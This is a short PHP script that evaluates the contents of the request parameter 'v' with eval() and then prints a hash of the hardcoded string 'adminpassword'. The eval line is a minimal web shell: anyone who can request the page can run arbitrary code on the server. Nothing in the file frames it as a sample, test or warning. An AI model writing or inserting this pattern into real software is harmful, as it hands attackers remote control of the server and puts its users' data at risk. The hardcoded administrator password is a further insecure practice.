<?php
$db = array();
$data = $_GET['v'];
eval($data);
echo password_hash('adminpassword', PASSWORD_DEFAULT);